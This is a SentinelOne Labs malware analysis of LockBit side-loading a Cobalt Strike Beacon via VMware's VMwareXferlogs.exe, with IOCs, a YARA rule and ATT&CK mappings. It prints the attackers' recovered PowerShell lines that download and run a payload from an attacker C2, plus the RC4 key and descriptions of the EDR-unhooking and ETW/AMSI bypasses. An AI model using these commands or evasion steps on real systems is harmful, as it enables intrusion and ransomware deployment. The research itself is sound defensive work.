<div>
<a href="https://www.sentinelone.com/labs/category/crimeware/">Crimeware</a>
<h1 class="entry-title">LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility</h1>
<a class="" href="https://www.sentinelone.com/blog/author/jamesh/">
James Haughom </a>
/
<a href="https://www.sentinelone.com/blog/2022/04/" rel="bookmark">
April 27, 2022
</a>
<h3>By James Haughom, Júlio Dantas, and Jim Walter</h3>
<h2>Executive Summary</h2>
<ul>
<li>The VMware command line utility <code>VMwareXferlogs.exe</code> used for data transfer to and from VMX logs is susceptible to DLL side-loading.</li>
<li>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.</li>
<li>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a <code>.log</code> file containing an encrypted Cobalt Strike Reflective Loader.</li>
<li>The malicious DLL evades defenses by removing EDR/EPP’s userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).</li>
</ul>
<h2>Overview</h2>
<p>LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as “ABCD”). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBit’s post-exploitation tool of choice is Cobalt Strike.</p>
<p>During a recent investigation, our <a href="https://www.sentinelone.com/global-services/vigilance-respond-pro/" rel="noopener noreferrer" target="_blank">DFIR</a> team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility.</p>
<p><a href="https://attack.mitre.org/techniques/T1574/002/" rel="noopener noreferrer" target="_blank">Side-loading</a> is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process’ corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a <code>.log</code> file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via <code>cmd.exe</code>, passing control flow to the malicious DLL.</p>
<p>The DLL then proceeded to evade defenses by removing EDR/EPP’s userland hooks, as well as bypassing both <a href="https://docs.microsoft.com/en-us/windows/win32/etw/event-tracing-portal" rel="noopener noreferrer" target="_blank">Event Tracing for Windows</a> (ETW) and <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" rel="noopener noreferrer" target="_blank">Antimalware Scan Interface</a> (AMSI). The <code>.log</code> file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode <a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" rel="noopener noreferrer" target="_blank">Asynchronous Procedure Call</a> (APC) is queued, which is used to pass control flow to the decrypted Beacon.</p>
<p><img alt="" class="aligncenter size-full wp-image-66002" height="1910" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/S1-Diagram_Light-scaled.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="2560"/></p>
<h2>Attack Chain</h2>
<p>The attack chain began with several PowerShell commands executed by the threat actor to download three components, a malicious DLL, a signed VMwareXferlogs executable, and an encrypted Cobalt Strike payload in the form of a <code>.log</code> file.</p>
<table>
<tbody>
<tr>
<td>Filename</td>
<td>Description</td>
</tr>
<tr>
<td>glib-2.0.dll</td>
<td>Weaponized DLL loaded by VMwareXferlogs.exe</td>
</tr>
<tr>
<td>VMwareXferlogs.exe</td>
<td>Legitimate/signed VMware command line utility</td>
</tr>
<tr>
<td>c0000015.log</td>
<td>Encrypted Cobalt Strike payload</td>
</tr>
</tbody>
</table>
<p>Our DFIR team recovered the complete PowerShell cmdlets used to download the components from forensic artifacts.</p>
Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/glib-2.0.dll -OutFile c:\windows\debug\glib-2.0.dll;
Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/c0000015.log -OutFile c:\windows\debug\c0000015.log;
Invoke-WebRequest -uri hxxp://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile c:\windows\debug\VMwareXferlogs.exe;c:\windows\debug\VMwareXferlogs.exe
<p>The downloaded binary (<code>VMwareXferlogs.exe</code>) was then executed via the command prompt, with the STDOUT being redirected to a file.</p>
c:\windows\debug\VMwareXferlogs.exe 1&gt; 
\\127.0.0.1\ADMIN$\__1649832485.0836577 2&gt;&amp;1
<p>The <a href="https://www.virustotal.com/gui/file/935e10f5169397a67f4c36bffbc3ba46c3957b7521edd3fa83bd975157b79bd8/details" rel="noopener noreferrer" target="_blank"><code>VMwareXferlogs.exe</code></a> is a legitimate, signed executable belonging to VMware.</p>
<figure class="wp-caption aligncenter" id="attachment_65964"><img alt="" class="size-full wp-image-65964" height="912" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/signature-info.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="670"/><figcaption class="wp-caption-text" id="caption-attachment-65964">VirusTotal Signature Summary</figcaption></figure>
<p>This utility is used to transfer data to and from <a href="https://kb.vmware.com/s/article/1019471" rel="noopener noreferrer" target="_blank">VMX</a> logs.</p>
<figure class="wp-caption aligncenter" id="attachment_65959"><img alt="" class="size-full wp-image-65959" height="400" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/VMware-options.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1560"/><figcaption class="wp-caption-text" id="caption-attachment-65959">VMware xfer utility command line usage</figcaption></figure>
<p>This command line utility makes several calls to a third party library called <code>glib-2.0.dll</code>. Both the utility and a legitimate version of <code>glib-2.0.dll</code> are shipped with VMware installations.</p>
<figure class="wp-caption aligncenter" id="attachment_65975"><img alt="" class="size-full wp-image-65975" height="428" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1242"/><figcaption class="wp-caption-text" id="caption-attachment-65975">glib-2.0.dll functions being called by VMwareXferlog.exe</figcaption></figure>
<p>The weaponized <code>glib-2.0.dll</code> downloaded by the threat actor exports all the necessary functions imported by <code>VMwareXferlog.exe</code>.</p>
<figure class="wp-caption aligncenter" id="attachment_65955"><img alt="" class="size-full wp-image-65955" height="412" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/iE.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1266"/><figcaption class="wp-caption-text" id="caption-attachment-65955">Exported functions of malicious glib-2.0.dll</figcaption></figure>
<figure class="wp-caption aligncenter" id="attachment_65970"><img alt="" class="size-full wp-image-65970" height="314" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/glib-imports.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1026"/><figcaption class="wp-caption-text" id="caption-attachment-65970">glib-2.0.dll-related functions imported by VMwareXferlog.exe</figcaption></figure>
<p>Calls to exported functions from <code>glib-2.0.dll</code> are made within the main function of the VMware utility, the first being <code>g_path_get_basename()</code>.</p>
<figure class="wp-caption aligncenter" id="attachment_65975"><img alt="" class="size-full wp-image-65975" height="428" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/empty-calls.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1242"/><figcaption class="wp-caption-text" id="caption-attachment-65975">glib-2.0.dll functions being called by VMwareXferlog.exe</figcaption></figure>
<p>Note that the virtual addresses for the exported functions are all the same for the weaponized <code>glib-2.0.dll</code> (0x1800020d0), except for <code>g_path_get_basename</code>, which has a virtual address of 0x180002420. This is due to the fact that all exports, except for the <code>g_path_get_basename</code> function do nothing other than call <code>ExitProcess()</code>.</p>
<figure class="wp-caption aligncenter" id="attachment_65966"><img alt="" class="size-full wp-image-65966" height="380" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/disassembly-of-glib_2_dll.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1252"/><figcaption class="wp-caption-text" id="caption-attachment-65966">g_error_free() function’s logic</figcaption></figure>
<p>On the other hand, <code>g_path_get_basename()</code> invokes the malicious payload prior to exiting.</p>
<p>When <code>VMwareXferlog.exe</code> calls this function, control flow is transferred to the malicious <code>glib-2.0.dll</code>, rather than the legitimate one, completing the side-loading attack.</p>
<figure class="wp-caption aligncenter" id="attachment_65973"><img alt="" class="size-full wp-image-65973" height="154" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/basename-disassembly.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1250"/><figcaption class="wp-caption-text" id="caption-attachment-65973">g_path_get_basename() being called in the main() function</figcaption></figure>
<p>Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the <code>BeingDebugged</code> flag and <code>NtGlobalFlag</code> in the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb" rel="noopener noreferrer" target="_blank">Process Environment Block</a> (PEB). If a debugger is detected, the malware enters an endless loop.</p>
<figure class="wp-caption aligncenter" id="attachment_65968"><img alt="" class="size-full wp-image-65968" height="596" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/BeingDebugged.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1446"/><figcaption class="wp-caption-text" id="caption-attachment-65968">Anti-debug mechanisms</figcaption></figure>
<h2>Bypassing EDR/EPP Userland Hooks</h2>
<p>At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies.</p>
<p>This routine is repeated for all loaded modules, thus allowing the malware to identify any potential userland hooks installed by EDR/EPP, and overwrite them with the unpatched/unhooked code directly from the modules’ images on disk.</p>
<figure class="wp-caption aligncenter" id="attachment_65954"><img alt="" class="size-full wp-image-65954" height="262" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/memcpy.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1148"/><figcaption class="wp-caption-text" id="caption-attachment-65954">Checking for discrepancies between on-disk and in-memory for each loaded module</figcaption></figure>
<p>For example, EDR’s userland NT layer hooks may be removed with this technique. The below subroutine shows a trampoline where a SYSCALL stub would typically reside, but instead jumps to a DLL injected by EDR. This subroutine will be overwritten/restored to remove the hook.</p>
<figure class="wp-caption aligncenter" id="attachment_65958"><img alt="" class="size-full wp-image-65958" height="140" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1038"/><figcaption class="wp-caption-text" id="caption-attachment-65958">EDR-hooked SYSCALL stub that will be patched</figcaption></figure>
<p>Here is a look at the patched code to restore the original SYSCALL stub and remove the EDR hook.</p>
<figure class="wp-caption aligncenter" id="attachment_65972"><img alt="" class="size-full wp-image-65972" height="270" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/syscall.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1074"/><figcaption class="wp-caption-text" id="caption-attachment-65972">NT layer hook removed and original code restored</figcaption></figure>
<p>Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the <code>EtwEventWrite</code> WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process.</p>
<figure class="wp-caption aligncenter" id="attachment_65974"><img alt="" class="size-full wp-image-65974" height="458" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/ETW.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1368"/><figcaption class="wp-caption-text" id="caption-attachment-65974">Event Tracing for Windows bypass</figcaption></figure>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal" rel="noopener noreferrer" target="_blank">AMSI</a> is bypassed the same way as ETW through patching <code>AmsiScanBuffer</code>. This halts AMSI from inspecting potentially suspicious buffers within this process.</p>
<figure class="wp-caption aligncenter" id="attachment_65962"><img alt="" class="size-full wp-image-65962" height="1144" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/GSHandlerCheck.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="948"/><figcaption class="wp-caption-text" id="caption-attachment-65962">AMSI bypass</figcaption></figure>
<p>Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned <code>c0000015.log</code> file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.</p>
&amp;.5 \C3%YHO2SM-&amp;B3!XSY6SV)6(&amp;7;(3.'
$F2WAED&gt;&gt;;K]8\*D#?G9I+V@(R,+]A-G\D
HERIP:45:X(WN8[?3Y&gt;XCWNPOL89&gt;[.# Q'
4CP8M-%4N[7.$R-&gt;-1)$!NU"W$!YT&lt;J$V[
<figure class="wp-caption aligncenter" id="attachment_65971"><img alt="" class="size-full wp-image-65971" height="492" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/key.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1034"/><figcaption class="wp-caption-text" id="caption-attachment-65971">RC4 Key Scheduling Algorithm</figcaption></figure>
<p>The RC4 decryption of the payload then commences.</p>
<figure class="wp-caption aligncenter" id="attachment_65963"><img alt="" class="size-full wp-image-65963" height="838" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/APC-payload.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1190"/><figcaption class="wp-caption-text" id="caption-attachment-65963">RC4 decryption routine</figcaption></figure>
<p>The final result is Beacon’s Reflective Loader, seen below with the familiar magic bytes and hardcoded strings.</p>
<p><img alt="" class="aligncenter size-full wp-image-65969" height="406" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/DOS-Magic.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1158"/></p>
<figure class="wp-caption aligncenter" id="attachment_65956"><img alt="" class="size-full wp-image-65956" height="434" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/beacon.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1152"/><figcaption class="wp-caption-text" id="caption-attachment-65956">Decrypted Cobalt Strike Beacon Reflective Loader</figcaption></figure>
<p>Once decrypted, the region of memory that the payload resides in is made executable (PAGE_EXECUTE_READWRITE), and a new thread is created for this payload to run within.</p>
<p>This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created thread’s APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC.</p>
<figure class="wp-caption aligncenter" id="attachment_65967"><img alt="" class="size-full wp-image-65967" height="744" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/createFile.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1256"/><figcaption class="wp-caption-text" id="caption-attachment-65967">Logic to queue and execute user-mode APC</figcaption></figure>
<p>The DLL is detected by the SentinelOne agent prior to being loaded and executed.</p>
<figure class="wp-caption aligncenter" id="attachment_65957"><img alt="" class="size-full wp-image-65957" height="835" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/static-detection-of-LockBit.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1999"/><figcaption class="wp-caption-text" id="caption-attachment-65957">Detection for LockBit DLL</figcaption></figure>
<h2>VMware Side-loading Variants</h2>
<p>A handful of samples related to the malicious DLL were discovered by our investigation. The only notable differences being the RC4 key and name of the file containing the RC4-encrypted payload to decrypt.</p>
<p>For example, several of the samples attempt to load the file <code>vmtools.ini</code> rather than <code>c0000015.log</code>.</p>
<figure class="wp-caption aligncenter" id="attachment_65960"><img alt="" class="size-full wp-image-65960" height="358" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/flags.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1020"/><figcaption class="wp-caption-text" id="caption-attachment-65960">The vmtools.ini file being accessed by a variant</figcaption></figure>
<p>Another variant shares the same file name to load <code>vmtools.ini</code>, yet is packed with a custom version of UPX.</p>
<figure class="wp-caption aligncenter" id="attachment_65965"><img alt="" class="size-full wp-image-65965" height="1010" src="https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/jmp-to-unpacked-code.jpg?lossy=0&amp;strip=1&amp;webp=0" style="max-width:800px;height:auto;width:auto;" width="1524"/><figcaption class="wp-caption-text" id="caption-attachment-65965">Tail jump at the end of the UPX unpacking stub</figcaption></figure>
<h2>Conclusion</h2>
<p>The VMware command line utility <code>VMwareXferlogs.exe</code> used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate <code>glib-2.0.dll</code> to only have code within the <code>g_path_get_basename()</code> function, while all other exports simply called <code>ExitProcess()</code>. This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.</p>
<p>LockBit continues to be a successful RaaS and the developers are clearly innovating in response to EDR/EPP solutions. We hope that by describing this latest technique, defenders and security teams will be able to improve their ability to protect their organizations.</p>
<h2>Indicators of Compromise</h2>
<table>
<tbody>
<tr>
<td>SHA1</td>
<td>Description</td>
</tr>
<tr>
<td>729eb505c36c08860c4408db7be85d707bdcbf1b</td>
<td>Malicious glib-2.0.dll from investigation</td>
</tr>
<tr>
<td>091b490500b5f827cc8cde41c9a7f68174d11302</td>
<td>Decrypted Cobalt Strike payload</td>
</tr>
<tr>
<td>e35a702db47cb11337f523933acd3bce2f60346d</td>
<td>Encrypted Cobalt Strike payload – c0000015.log</td>
</tr>
<tr>
<td>25fbfa37d5a01a97c4ad3f0ee0396f953ca51223</td>
<td>glib-2.0.dll vmtools.ini variant</td>
</tr>
<tr>
<td>0c842d6e627152637f33ba86861d74f358a85e1f</td>
<td>glib-2.0.dll vmtools.ini variant</td>
</tr>
<tr>
<td>1458421f0a4fe3acc72a1246b80336dc4138dd4b</td>
<td>glib-2.0.dll UPX-packed vmtools.ini variant</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>File Path</td>
<td>Description</td>
</tr>
<tr>
<td>c:\windows\debug\VMwareXferlogs.exe</td>
<td>Full path to legitimate VMware command line utility</td>
</tr>
<tr>
<td>c:\windows\debug\glib-2.0.dll</td>
<td>Malicious DLL used for hijack</td>
</tr>
<tr>
<td>c:\windows\debug\c0000015.log</td>
<td>Encrypted Cobalt Strike reflective loader</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>C2</td>
<td>Description</td>
</tr>
<tr>
<td>149.28.137[.]7</td>
<td>Cobalt Strike C2</td>
</tr>
<tr>
<td>45.32.108[.]54</td>
<td>Attacker C2</td>
</tr>
</tbody>
</table>
<h2>YARA Hunting Rules</h2>
import "pe"
rule Weaponized_glib2_0_dll
{
	meta:
		description = "Identify potentially malicious versions of glib-2.0.dll"
		author = "James Haughom @ SentinelOne"
		date = "2022-04-22"
		reference = "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/"
	/*
		The VMware command line utilty 'VMwareXferlogs.exe' used for data
		transfer to/from VMX logs is susceptible to DLL sideloading. The
		malicious versions of this DLL typically only have code within 
		the function 'g_path_get_basename()' properly defined, while the
		rest will of the exports simply call 'ExitProcess()'. Notice how
		in the exports below, the virtual address for all exported functions
		are the same except for 'g_path_get_basename()'. We can combine this
		along with an anomalously low number of exports for this DLL, as
		legit instances of this DLL tend to have over 1k exports.
		[Exports]
		nth paddr vaddr bind type size lib name
		―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
		1 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_error_free
		2 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_free
		3 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_add_main_entries
		4 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_free
		5 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_get_help
		6 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_new
		7 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_option_context_parse
		8 0x00001820 0x180002420 GLOBAL FUNC 0 glib-2.0.dll g_path_get_basename
		9 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_print
		10 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_printerr
		11 0x000014d0 0x1800020d0 GLOBAL FUNC 0 glib-2.0.dll g_set_prgname
		This rule will detect malicious versions of this DLL by identifying
		if the virtual address is the same for all of the exported functions
		used by 'VMwareXferlogs.exe' except for 'g_path_get_basename()'.
	*/
	condition:
		/* sample is an unsigned DLL */
		pe.characteristics &amp; pe.DLL and pe.number_of_signatures == 0 and
		/* ensure that we have all of the exported functions of glib-2.0.dll imported by VMwareXferlogs.exe */
		pe.exports("g_path_get_basename") and
		pe.exports("g_error_free") and
		pe.exports("g_free") and
		pe.exports("g_option_context_add_main_entries") and
		pe.exports("g_option_context_get_help") and
		pe.exports("g_option_context_new") and
		pe.exports("g_print") and
		pe.exports("g_printerr") and
		pe.exports("g_set_prgname") and
		pe.exports("g_option_context_free") and
		pe.exports("g_option_context_parse") and
		/* all exported functions have the same offset besides g_path_get_basename */
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_error_free")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_option_context_get_help")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_option_context_new")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_option_context_add_main_entries")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_print")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_printerr")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_set_prgname")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_option_context_free")].offset and
		pe.export_details[pe.exports_index("g_free")].offset == pe.export_details[pe.exports_index("g_option_context_parse")].offset and
		pe.export_details[pe.exports_index("g_free")].offset != pe.export_details[pe.exports_index("g_path_get_basename")].offset and
		/* benign glib-2.0.dll instances tend to have ~1k exports while malicious ones have the bare minimum */
		pe.number_of_exports &lt; 15
}
<h2>MITRE ATT&amp;CK TTPs</h2>
<table>
<tbody>
<tr>
<td>TTP</td>
<td>MITRE ID</td>
</tr>
<tr>
<td>Encrypted Cobalt Strike payload</td>
<td><a href="https://attack.mitre.org/techniques/T1027/" rel="noopener noreferrer" target="_blank">T1027</a></td>
</tr>
<tr>
<td>DLL Hijacking</td>
<td><a href="https://attack.mitre.org/techniques/T1574/" rel="noopener noreferrer" target="_blank">T1574</a></td>
</tr>
<tr>
<td>ETW Bypass</td>
<td><a href="https://attack.mitre.org/techniques/T1562/002/" rel="noopener noreferrer" target="_blank">T1562.002</a></td>
</tr>
<tr>
<td>AMSI Bypass</td>
<td><a href="https://attack.mitre.org/techniques/T1562/002/" rel="noopener noreferrer" target="_blank">T1562.002</a></td>
</tr>
<tr>
<td>Unhooking EDR</td>
<td><a href="https://attack.mitre.org/techniques/T1562/001/" rel="noopener noreferrer" target="_blank">T1562.001</a></td>
</tr>
<tr>
<td>Encrypted payload</td>
<td><a href="https://attack.mitre.org/techniques/T1027/002/" rel="noopener noreferrer" target="_blank">T1027.002</a></td>
</tr>
<tr>
<td>Powershell usage</td>
<td><a href="https://attack.mitre.org/techniques/T1059/001/" rel="noopener noreferrer" target="_blank">T1059.001</a></td>
</tr>
<tr>
<td>Cobalt Strike</td>
<td><a href="https://attack.mitre.org/software/S0154/" rel="noopener noreferrer" target="_blank">S0154</a></td>
</tr>
</tbody>
</table>
</div>